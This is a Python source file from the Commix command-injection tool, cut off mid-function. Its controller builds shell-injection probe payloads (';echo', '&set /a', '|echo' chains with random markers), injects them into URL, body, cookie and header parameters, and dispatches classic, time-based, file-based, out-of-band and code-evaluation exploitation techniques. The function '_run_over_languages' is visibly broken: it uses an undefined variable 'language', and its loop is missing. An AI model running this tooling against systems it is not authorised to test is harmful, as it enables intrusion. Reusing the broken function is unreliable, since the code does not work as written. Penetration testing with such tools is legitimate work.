#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import time
import random
import string
import difflib
from src.core.parse import cmdline as menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.modules import modules_handler
from src.core.requests import authentication
from src.core.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.core.techniques.time_based import tb_handler
from src.core.techniques.oob import oob_handler
from src.core.techniques.file_based import fb_handler
from src.core.techniques.tempfile_based import tfb_handler
from src.core.techniques.classic import cb_handler
from src.core.eval import eb_handler

"""
Command Injection and exploitation controller.
Checks if the testable parameter is exploitable.
"""

"""
Generate fresh operands and markers per call; match the markers around the computed value to avoid false positives.
"""
def basic_payload_generator():
  rand_a = random.randint(1, 10000)
  rand_b = random.randint(1, 10000)
  calc_string = str(rand_a) + "+" + str(rand_b)
  marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
  marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))

  suffix = ""
  if settings.USE_BACKTICKS:
    # 'expr' wants its operands as separate arguments - given one, it echoes the string back
    # instead of adding anything up.
    prefix = "expr "
    calc_string = str(rand_a) + settings.SINGLE_WHITESPACE + "+" + settings.SINGLE_WHITESPACE + str(rand_b)
  else:
    prefix = "("
    suffix = ")"
  settings.BASIC_STRING = prefix + calc_string + suffix
  alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""

  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2,
                                              "|echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2 +
                                              "&echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2
                                              ]
  settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2,
                                              "|echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2 +
                                              "&echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2
                                              ]
  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(str(rand_a + rand_b)) + r"\s*" + re.escape(marker2)

"""
Initializing basic level check status
"""
def basic_level_checks():
  settings.TIME_RELATED_ATTACK = False
  settings.SKIP_CODE_INJECTIONS = None
  settings.SKIP_COMMAND_INJECTIONS = None
  settings.IDENTIFIED_COMMAND_INJECTION = False
  settings.IDENTIFIED_WARNINGS = False
  settings.IDENTIFIED_EVAL_PROBE = False

"""
Initializing HTTP Headers parameters injection status
"""
def init_http_header_injection_status():
  settings.HTTP_HEADERS_INJECTION = None
  settings.USER_AGENT_INJECTION = None
  settings.REFERER_INJECTION = None
  settings.HOST_INJECTION = None

"""
Initializing Cookie parameters injection status
"""
def init_cookie_injection_status():
  settings.COOKIE_INJECTION = None

"""
Check for previously stored sessions.
"""
def check_for_stored_sessions(url, check_parameter, http_request_method):
  settings.STORED_TECHNIQUES = {}
  if not menu.options.ignore_session and not menu.options.flush_session:
    if os.path.isfile(settings.SESSION_FILE) and not settings.REQUIRED_AUTHENTICATION:
      url, check_parameter = session_handler.check_stored_injection_points(url, check_parameter, http_request_method)
      # Load stored techniques once so each can resume without re-querying storage.
      settings.STORED_TECHNIQUES = session_handler.load_stored_techniques(url, check_parameter, http_request_method)
  return url, check_parameter

"""
Heuristic request(s)
"""
def heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place):
  data = None
  cookie = None
  tmp_url = url
  payload, prefix = parameters.prefixes(payload, prefix="")
  payload, suffix = parameters.suffixes(payload, suffix="")
  payload = checks.tamper_outside_single_quotes(payload, lambda part: part.replace(settings.SINGLE_WHITESPACE, whitespace))
  if settings.IS_JSON:
    payload = _urllib.parse.unquote(payload)
  payload = checks.perform_payload_modification(payload)
  if settings.VERBOSITY_LEVEL >= 1:
    settings.print_data_to_stdout(settings.print_payload(payload))
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    payload = checks.payload_fixation(payload)
    # Percent-encode cookie values to safely handle delimiters and special characters.
    encoded_payload = checks.encode_payload(payload)
    cookie = checks.process_injectable_value(encoded_payload, menu.options.cookie).encode(settings.DEFAULT_CODEC)
  else:
    cookie = checks.remove_tags(menu.options.cookie).encode(settings.DEFAULT_CODEC)

  if not settings.IGNORE_USER_DEFINED_POST_DATA and menu.options.data and settings.INJECT_TAG in menu.options.data:
    # A structured body escapes for itself; a form-encoded one needs the payload encoded for it.
    body_payload = payload if (settings.IS_JSON or settings.IS_XML) else checks.encode_payload(payload)
    data = checks.restore_xml_layout(checks.process_injectable_value(body_payload, menu.options.data)).encode(settings.DEFAULT_CODEC)
  else:
    if settings.USER_DEFINED_POST_DATA:
      settings.USER_DEFINED_POST_DATA = checks.remove_tags(settings.USER_DEFINED_POST_DATA)
      data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
  if settings.INJECT_TAG in url:
    # Encode query string, preserving delimiters and configured parameter delimiter
    encoded_payload = checks.encode_payload(payload)
    tmp_url = checks.process_injectable_value(encoded_payload, url)
  else:
    tmp_url = checks.remove_tags(tmp_url)
    url = checks.remove_tags(url)

  request = _urllib.request.Request(tmp_url, data, method=http_request_method)
  if cookie:
    request.add_header(settings.COOKIE, cookie)
  # The payload is carried by the header itself here - 'headers.do_check' leaves the header alone
  # while its injection flag is set, so that this is the only value it is given.
  if check_parameter_in_http_header(check_parameter, place):
    settings.CUSTOM_HEADER_NAME = check_parameter.title()
    if settings.CUSTOM_HEADER_VALUE.replace(settings.INJECT_TAG, "") in settings.CUSTOM_HEADER_VALUE:
      request.add_header(settings.CUSTOM_HEADER_NAME, settings.CUSTOM_HEADER_VALUE.replace(settings.INJECT_TAG, "").replace(settings.CUSTOM_HEADER_VALUE, payload).encode(settings.DEFAULT_CODEC))
    else:
      request.add_header(settings.CUSTOM_HEADER_NAME, payload.encode(settings.DEFAULT_CODEC))
  headers.do_check(request)
  response = requests.get_request_response(request)
  return response, url

"""
Announce what the heuristic found. One wording for every channel it can come back over, and for
either sink - which technique answered is the technique's business, not something to commit to
while still guessing. All the heuristic is entitled to add is what it happened to learn on the way,
which goes in the parenthesis its caller hands over.
"""
def announce_heuristic_finding(detail):
  info_msg = "Heuristic (basic) test shows that "
  info_msg += settings.CHECKING_PARAMETER + " might be injectable (" + detail + ")."
  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))

"""
Heuristic (basic) test for command injection
"""
def command_injection_heuristic_basic(url, http_request_method, check_parameter, place):
  check_parameter = check_parameter.lstrip().rstrip()
  checks.perform_payload_modification(payload="")
  basic_payload_generator()
  if menu.options.interpreter:
    basic_payloads = settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS
  else:
    basic_payloads = settings.BASIC_COMMAND_INJECTION_PAYLOADS

  basic_payloads = [x.replace(settings.RANDOM_STRING_GENERATOR, settings.SINGLE_WHITESPACE.strip()) for x in basic_payloads]

  """
  One shape per shell, and only the shape worth sending.

  The two payloads are the same question asked in each shell's own syntax, so which of them answers
  is what names the shell. Where the operating system is already known - the banner said so, or
  '--os' did - the other shape cannot execute, and sending it only doubles the requests.
  """
  shaped = list(zip(basic_payloads, ("Unix-like", "Windows")))
  if settings.IDENTIFIED_TARGET_OS or menu.options.os:
    wanted = "Windows" if settings.TARGET_OS == settings.OS.WINDOWS else "Unix-like"
    shaped = [pair for pair in shaped if pair[1] == wanted] or shaped

  settings.CLASSIC_STATE = True
  try:
    for whitespace in settings.WHITESPACES:
      if not settings.IDENTIFIED_COMMAND_INJECTION:
        for payload, shell_os in shaped:
          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
          if type(response) is not bool and response is not None:
            html_data = checks.process_page_content(response, action="decode")
            match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
            if match:
              settings.IDENTIFIED_COMMAND_INJECTION = True
              # The token the rest of the code compares against, and then what was really shown.
              checks.set_target_os(shell_os)
              # A payload that ran answers what the banner could not, so nothing need be asked.
              settings.OS_IDENTIFICATION_PENDING = False
              announce_heuristic_finding("identified command shell: '" + checks.target_shell_label() + "'")
              # A shell answering here says nothing about whether a string is also evaluated as
              # code, so it settles the question only where the code injection sink was not asked
              # for by name - otherwise every technique carrying it would skip itself, and the run
              # would report "not injectable" without having sent one of their payloads.
              if not menu.options.eval_sink:
                settings.SKIP_CODE_INJECTIONS = True
              break

    settings.CLASSIC_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Heuristic (basic) test over the out-of-band channel.

The results-based test reads the sum back out of the response, so it is blind to exactly the points
'--oob' exists for. Without this, such a parameter is reported as probably not injectable - and with
'--smart' it would be skipped outright.
"""
def oob_heuristic_basic(url, http_request_method, check_parameter, place):
  from src.core.techniques.oob import oob_payloads as oob_payloads

  channel = checks.init_oob_channel()
  if channel is None:
    return url

  # Both, unless the results-based test already settled which one it is - or the user has said so
  # with '--os', which no heuristic of ours gets to overrule.
  target_systems = (settings.OS.UNIX, settings.OS.WINDOWS)
  if settings.IDENTIFIED_COMMAND_INJECTION or menu.options.os:
    target_systems = (settings.TARGET_OS,)

  attempts = []
  for target_os in target_systems:
    payload, probes = oob_payloads.heuristic_payload(channel, target_os)
    if settings.VERBOSITY_LEVEL != 0:
      settings.print_data_to_stdout(settings.print_payload(payload))
    heuristic_request(url, http_request_method, check_parameter, payload, settings.WHITESPACES[0], place)
    attempts.append((target_os, probes))

  # A name lookup beats an HTTPS round trip almost every time, so the client that answers first is
  # nearly always the one least worth leading with. Once only a lookup has landed, hold the window
  # open a little longer for an HTTP client rather than settling on the spot.
  def _http_first():
    best = None
    for target_os, probes in attempts:
      for token, transport in probes:
        if not channel.seen(token, protocol=oob_payloads.required_protocol(transport)):
          continue
        if oob_payloads.required_protocol(transport) == "http":
          return (target_os, transport)
        if best is None:
          best = (target_os, transport)
    return best

  channel.poll_now()
  answered = None
  deadline = time.time() + settings.OOB_TIMEOUT
  while time.time() < deadline:
    answered = _http_first()
    if answered is not None:
      if oob_payloads.required_protocol(answered[1]) == "http":
        break
      # Only a lookup so far - give an HTTP client a brief grace period to follow it in.
      deadline = min(deadline, time.time() + settings.OOB_HTTP_GRACE)
    # Asked for every round: the idle interval would hold the answer back for seconds after it lands.
    channel.poll_now()
    time.sleep(settings.OOB_WAIT_POLL_INTERVAL)

  if answered is None:
    return url

  target_os, transport = answered
  # The lookup came back, so the payload around it ran - and any HTTP client in that same payload
  # has already had its chance on a boundary that works. Naming them here keeps the sweep from
  # asking them again on every boundary it tries.
  if oob_payloads.required_protocol(transport) == "dns":
    silent = [candidate for _, probes in attempts for token, candidate in probes
              if oob_payloads.required_protocol(candidate) == "http" and not channel.seen(token, protocol="http")]
    settings.OOB_HEURISTIC_HTTP_SILENT = list(dict.fromkeys(silent))
  # Already identified means the results-based test got there first, so the interaction is not
  # news - which client the target answered on still is, and the sweep leads with it.
  already_identified = settings.IDENTIFIED_COMMAND_INJECTION
  settings.IDENTIFIED_COMMAND_INJECTION = True
  settings.OOB_HEURISTIC_TRANSPORT = transport
  settings.SKIP_CODE_INJECTIONS = True
  if already_identified:
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "The target answered out-of-band over '" + transport + "'."
      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
    return url
  if not menu.options.os:
    settings.TARGET_OS = target_os
  announce_heuristic_finding("identified command shell: '" + checks.target_shell_label() + "'")
  return url

"""
Heuristic (basic) test for code injection warnings
"""
def code_injections_heuristic_basic(url, http_request_method, check_parameter, place):
  check_parameter = check_parameter.lstrip().rstrip()
  # What the probe answered with. A complaint from the interpreter names the language without
  # naming a version, so the language is all there is to report in that case.
  detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
  settings.EVAL_BASED_STATE = True
  try:
    whitespace = settings.SINGLE_WHITESPACE
    if (not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE):
      """
      A complaint is worth less than a version, so one does not end the search.

      Which boundary reaches the sink is what the sweep is for, and the ones that miss tend to make
      the interpreter complain - so stopping at the first complaint reports the language and never
      learns the version a later boundary would have answered with. A version ends it; a complaint
      is remembered and the rest are tried.
      """
      """
      Where no language was named, each supported one is probed with its own payloads.

      Nothing about the target says which language is evaluating the string, and a probe written for
      one of them means nothing to another - so asking only the default answered for that language
      and reported the parameter as not injectable for every other.

      Whichever language answers is left in force, so the techniques that follow speak the one the
      heuristic found rather than starting the search over.
      """
      if not menu.options.eval_sink or menu.options.eval_sink == settings.EVAL_ALL_LANGUAGES:
        languages = settings.SUPPORTED_EVAL_LANGUAGES
        # Whichever the target named for itself goes first - the others still follow, since a
        # header says what runs the page, not what evaluates a string inside it.
        if settings.IDENTIFIED_EVAL_LANGUAGE in languages:
          languages = (settings.IDENTIFIED_EVAL_LANGUAGE,) + tuple(
            _ for _ in languages if _ != settings.IDENTIFIED_EVAL_LANGUAGE)
      else:
        languages = (settings.EVAL_GRAMMAR.NAME,)
      for language in languages:
        settings.set_eval_grammar(language)
        if len(languages) > 1 and settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Testing the '" + settings.EVAL_GRAMMAR.LABEL + "' language."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        for payload in settings.EVAL_PROBE_PAYLOADS:
          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
          if type(response) is not bool and response is not None:
            html_data = checks.process_page_content(response, action="decode")
            match = re.search(settings.EVAL_PROBE_REGEX, html_data)
            if match:
              detail = "identified " + settings.EVAL_GRAMMAR.LABEL + " version: '" + match.group(1) + "'"
              settings.IDENTIFIED_EVAL_PROBE = True
              break
            for warning in settings.EVAL_WARNINGS:
              if warning in html_data:
                settings.IDENTIFIED_WARNINGS = True
                detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
                break
        if settings.IDENTIFIED_EVAL_PROBE:
          break

      # Said once, whichever of the two the sweep came back with.
      if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_EVAL_PROBE:
        announce_heuristic_finding(detail)
        # Code injection is tested only where it was asked for, so what the heuristic saw is
        # named, the switch that would act on it is named too, and the run carries on testing
        # for command injection either way.
        if menu.options.eval_sink:
          settings.SKIP_COMMAND_INJECTIONS = True
        elif not settings.EVAL_SUGGESTED:
          settings.EVAL_SUGGESTED = True
          # The sweep already found which language answered, so the switch is offered naming it
          # rather than sending the run back over every language to find it again.
          language = settings.EVAL_GRAMMAR.NAME
          message = "Do you want to test it for code injection (i.e. option '--eval=" + language + "')? [Y/n] "
          if common.read_input(message, default="Y", check_batch=True) in settings.CHOICE_YES:
            menu.options.eval_sink = language
            settings.SKIP_COMMAND_INJECTIONS = True

    settings.EVAL_BASED_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Run one technique via the given exploit() callable, updating its own state flag in settings - the shared skeleton behind the 4 functions below.
"""
"""
Run one attempt of an evaluation-sink technique per language.

Nothing the target says identifies the language evaluating the string, so where '--eval' named none,
each supported one is tried in turn until one answers. Where it named one, that is the only one
tried. The grammar is left pointing at whichever language answered, so the exploitation that follows
speaks the same one the detection did.
"""
def _run_over_languages(exploit):
  if menu.options.eval_sink != settings.EVAL_ALL_LANGUAGES:
    return exploit() != False
  """
  A language the heuristic already recognised is the only one tried.

  Its probe came back with that language's own version, which is as much as a sweep here could
  establish - and every language tried and rejected costs a full delay on the time-based technique.
  """
  if settings.IDENTIFIED_EVAL_PROBE:
    return exploit() != False
  languages = settings.SUPPORTED_EVAL_LANGUAGES
  # Whichever the target named for itself goes first - the others still follow, since a header
  # says what runs the page, not what evaluates a string inside it.
  if settings.IDENTIFIED_EVAL_LANGUAGE in languages:
    languages = (settings.IDENTIFIED_EVAL_LANGUAGE,) + tuple(
      _ for _ in languages if _ != settings.IDENTIFIED_EVAL_LANGUAGE)
    settings.set_eval_grammar(language)
    if len(languages) > 1 and settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Testing the '" + settings.EVAL_GRAMMAR.LABEL + "' language."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    if exploit() != False:
      return True
  return False

# Run one technique, and say it was skipped where it did not run.
def run_technique(injection_type, technique, state_name, skip_flag_name, tech_letter, exploit, eval_sink=False):
  setattr(settings, state_name, None)
  if not getattr(settings, skip_flag_name):
    if checks.technique_selected(tech_letter, eval_sink):
      setattr(settings, state_name, _run_over_languages(exploit) if eval_sink else exploit() != False)
  state = getattr(settings, state_name)
  if state == None or getattr(settings, skip_flag_name):
    checks.skipping_technique(technique, injection_type, state)

"""
Check if it's exploitable via classic command injection technique.
"""
def classic_command_injection_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CI
  technique = settings.INJECTION_TECHNIQUE.CLASSIC
  # Prove the injection by what the response carries back.
  def exploit():
    result = cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
    if result != False:
      settings.IDENTIFIED_COMMAND_INJECTION = True
      settings.SKIP_CODE_INJECTIONS = True
    return result
  run_technique(injection_type, technique, "CLASSIC_STATE", "SKIP_COMMAND_INJECTIONS", "c", exploit)

"""
Check if it's exploitable via dynamic code evaluation technique.
"""
def dynamic_code_evaluation_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
  # Prove the code injection by what the response carries back.
  def exploit():
    result = eb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
    if result != False:
      settings.SKIP_COMMAND_INJECTIONS = True
    return result
  run_technique(injection_type, technique, "EVAL_BASED_STATE", "SKIP_CODE_INJECTIONS", "c", exploit, eval_sink=True)

"""
Check if it's exploitable via time-based command injection technique.
"""
def timebased_technique(url, timesec, filename, http_request_method, url_time_response):
  # The delay proves execution either way - what the sink changes is only whether the payload is
  # written in the shell's language or in the one the target evaluates.
  eval_sink = bool(menu.options.eval_sink)
  injection_type = settings.INJECTION_TYPE.BLIND_CE if eval_sink else settings.INJECTION_TYPE.BLIND
  technique = settings.INJECTION_TECHNIQUE.TIME_BASED
  # Prove the injection by how long the target takes to answer.
  def exploit():
    result = tb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)
    if result != False and not eval_sink:
      settings.IDENTIFIED_COMMAND_INJECTION = True
    return result
  # Carrying the evaluation sink, this technique is skipped by whatever skips code injection - not
  # by the flag that skips command injection, which the code injection heuristic sets on its way past.
  skip_flag = "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS"
  run_technique(injection_type, technique, "TIME_BASED_STATE", skip_flag, "t", exploit, eval_sink=eval_sink)

"""
Check if it's exploitable via file-based command injection technique.
"""
def filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
  # The file proves execution either way - what the sink changes is only whether the command that
  # fills it is reached through a shell or through the string the target evaluates.
  eval_sink = bool(menu.options.eval_sink)
  injection_type = settings.INJECTION_TYPE.SEMI_BLIND_CE if eval_sink else settings.INJECTION_TYPE.SEMI_BLIND
  technique = settings.INJECTION_TECHNIQUE.FILE_BASED
  # Prove the injection by a file the target writes and then serves back.
  def exploit():
    if settings.LOAD_SESSION and settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED in settings.STORED_TECHNIQUES \
       and settings.INJECTION_TECHNIQUE.FILE_BASED not in settings.STORED_TECHNIQUES:
      # Skip the writable-directory prompt when resuming, but still need a real tmp_path.
      result = tfb_handler.exploitation(url, timesec, filename, checks.default_tmp_path(), http_request_method, url_time_response)
    else:
      result = fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)
    if result != False and not eval_sink:
      settings.IDENTIFIED_COMMAND_INJECTION = True
    return result
  # Carrying the evaluation sink, this technique is skipped by whatever skips code injection - not
  # by the flag that skips command injection, which the code injection heuristic sets on its way past.
  skip_flag = "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS"
  run_technique(injection_type, technique, "FILE_BASED_STATE", skip_flag, "f", exploit, eval_sink=eval_sink)

"""
Check if it's exploitable via out-of-band technique.
"""
def oob_command_injection_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.BLIND
  technique = settings.INJECTION_TECHNIQUE.OOB
  # Prove the injection by the target reaching out to somewhere else.
  def exploit():
    result = oob_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
    if result != False:
      settings.IDENTIFIED_COMMAND_INJECTION = True
    return result
  run_technique(injection_type, technique, "OOB_STATE", "SKIP_OOB_INJECTIONS", "o", exploit)

"""
Check parameter in HTTP header.
"""
def check_parameter_in_http_header(check_parameter, place):
  inject_http_headers = False
  # Answered from the place the parameter was dispatched from, never from what it is called: a
  # field named after a header is still a field, and a header is one wherever its value came from.
  if place in settings.HTTP_HEADER_PLACES:
    if settings.ACCEPT_VALUE not in settings.CUSTOM_HEADER_VALUE:
      inject_http_headers = True
  else:
    init_http_header_injection_status()
  return inject_http_headers

"""
Warn if changing the parameter never changes the response; classic/dynamic_code require reflection.
"""
def check_parameter_dynamism(url, http_request_method, check_parameter):
  if settings.LOAD_SESSION or not settings.TESTABLE_VALUE:
    return
  if menu.options.tech and "c" not in menu.options.tech and "e" not in menu.options.tech:
    return

  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG

  # Build the request, with the value carried wherever the parameter lives.
  def build(header_name, option_value, value):
    if settings.USER_DEFINED_POST_DATA:
      data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
    else:
      data = None
    request = _urllib.request.Request(url, data, method=http_request_method)
    headers.do_check(request)
    request.add_header(header_name, option_value.replace(marker, value))
    return request

  if settings.COOKIE_INJECTION and menu.options.cookie and marker in menu.options.cookie:
    param_label = "Cookie parameter '" + check_parameter + "'"
    fetch = lambda v: build(settings.COOKIE, menu.options.cookie, v)
  elif settings.USER_AGENT_INJECTION and menu.options.agent and marker in menu.options.agent:
    param_label = "User-Agent HTTP header"
    fetch = lambda v: build(settings.USER_AGENT, menu.options.agent, v)
  elif settings.REFERER_INJECTION and menu.options.referer and marker in menu.options.referer:
    param_label = "Referer HTTP header"
    fetch = lambda v: build(settings.REFERER, menu.options.referer, v)
  elif settings.HOST_INJECTION and menu.options.host and marker in menu.options.host:
    param_label = "Host HTTP header"
    fetch = lambda v: build(settings.HOST, menu.options.host, v)
  else:
    in_data = bool(menu.options.data) and marker in menu.options.data
    if not in_data and marker not in url:
      return
    param_label = ("POST" if in_data else "GET") + " parameter '" + check_parameter + "'"
    # Fetch the URL with one value in place of the parameter's own.
    def fetch(v):
      if in_data:
        data = menu.options.data.replace(marker, v)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC), method=http_request_method)
      else:
        request = _urllib.request.Request(url.replace(marker, v), method=http_request_method)
      headers.do_check(request)
      return request

  info_msg = "Testing if " + param_label + " is dynamic."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))

  # Sent the way every other request is, so the pacing, retries and error handling that hold for
  # the scan hold here too.
  def _body(value):
    response = requests.get_request_response(fetch(value))
    if not response or isinstance(response, bool):
      return None
    try:
      return response.read()
    except Exception:
      return None

  real_body = _body(settings.TESTABLE_VALUE)
  # The same value asked for twice: whatever differs between these two is the page moving on its
  # own, and a parameter is only dynamic where it changes the response by more than that.
  repeat_body = _body(settings.TESTABLE_VALUE)
  placeholder_body = _body(placeholder)
  if real_body is None or repeat_body is None or placeholder_body is None:
    return

  noise = difflib.SequenceMatcher(None, real_body, repeat_body).ratio()
  changed = difflib.SequenceMatcher(None, real_body, placeholder_body).ratio()
  if changed >= min(noise, settings.STABILITY_SIMILARITY_THRESHOLD):
    warn_msg = param_label + " does not appear to be dynamic."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  elif settings.VERBOSITY_LEVEL != 0:
    debug_msg = param_label + " appears to be dynamic."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

"""
Replace the parameter value with a disposable placeholder if the response stays the same but gets faster.
"""
def attempt_skip_testable_value(url, http_request_method, check_parameter):
  if not settings.TESTABLE_VALUE:
    return url
  if any((settings.COOKIE_INJECTION, settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION,
          settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION)):
    return url

  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
  in_data = bool(menu.options.data) and marker in menu.options.data
  in_url = marker in url
  if not in_data and not in_url:
    return url

  if settings.LOAD_SESSION:
    # Trust a previously confirmed placeholder outright - no live probe on resume.
    stored_placeholder = session_handler.check_stored_testable_value(url, check_parameter, http_request_method)
    if not stored_placeholder:
      return url
    if in_data:
      menu.options.data = menu.options.data.replace(marker, stored_placeholder + settings.INJECT_TAG)
    else:
      url = url.replace(marker, stored_placeholder + settings.INJECT_TAG)
    settings.TESTABLE_VALUE = stored_placeholder
    settings.TESTABLE_VALUE_OPTIMIZED = True
    return url

  param_label = ("POST" if in_data else "GET") + " parameter '" + check_parameter + "'"
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Testing if " + param_label + " requires its original value."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  # Build the request with the given value in place of the parameter's own.
  def build(value):
    if in_data:
      data = menu.options.data.replace(marker, value)
      request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC), method=http_request_method)
    else:
      request = _urllib.request.Request(url.replace(marker, value), method=http_request_method)
    headers.do_check(request)
    return request

  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))
  try:
    start = time.time()
    real_response = _urllib.request.urlopen(build(settings.TESTABLE_VALUE), timeout=settings.TIMEOUT)
    real_body = real_response.read()
    real_status = real_response.getcode()
    real_time = time.time() - start

    start = time.time()
    placeholder_response = _urllib.request.urlopen(build(placeholder), timeout=settings.TIMEOUT)
    placeholder_body = placeholder_response.read()
    placeholder_status = placeholder_response.getcode()
    placeholder_time = time.time() - start
  except Exception:
    return url

  same_status = real_status == placeholder_status
  similar_size = abs(len(real_body) - len(placeholder_body)) <= max(50, len(real_body) * 0.2)
  meaningfully_faster = placeholder_time < real_time * 0.7 and (real_time - placeholder_time) >= 0.5

  if same_status and similar_size and meaningfully_faster:
    if in_data:
      menu.options.data = menu.options.data.replace(marker, placeholder + settings.INJECT_TAG)
    else:
      url = url.replace(marker, placeholder + settings.INJECT_TAG)
    settings.TESTABLE_VALUE = placeholder
    settings.TESTABLE_VALUE_OPTIMIZED = True
    session_handler.import_testable_value_status(url, check_parameter, http_request_method, placeholder)
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "The real parameter value is not required, so it is skipped for faster requests."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  elif settings.VERBOSITY_LEVEL != 0:
    debug_msg = param_label + " appears to require its original value."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  return url

"""
Proceed to the injection process for the appropriate parameter.
"""
def injection_process(url, check_parameter, http_request_method, filename, timesec, place):
  settings.NOT_TESTABLE_PARAMETERS = False
  # Bound here rather than where the techniques run: the parameter may be skipped before reaching
  # them, and the loop over operating systems below reads this either way.
  end_detection = False

  check_parameter_dynamism(url, http_request_method, check_parameter)
  url = attempt_skip_testable_value(url, http_request_method, check_parameter)

  # Both, where the target's own answer did not identify one - that being what the question asked.
  # Taken by name: the class carries more attributes than the two, so slicing them handed back a
  # module path as an operating system.
  if settings.CHECK_BOTH_OS:
    os_targets = [settings.OS.UNIX, settings.OS.WINDOWS][:settings.OS_CHECKS_NUM]
  else:
    os_targets = [settings.TARGET_OS or settings.OS.UNIX]

  # Loop over the selected OS targets
  for os_target in os_targets:
    # A heuristic on an earlier pass may have settled which shell answers. Sweeping the other one
    # then costs a second full pass and, worse, writes over what was identified.
    if settings.IDENTIFIED_TARGET_OS and settings.TARGET_OS != os_target:
      continue
    settings.TARGET_OS = os_target

    if settings.PERFORM_BASIC_SCANS:
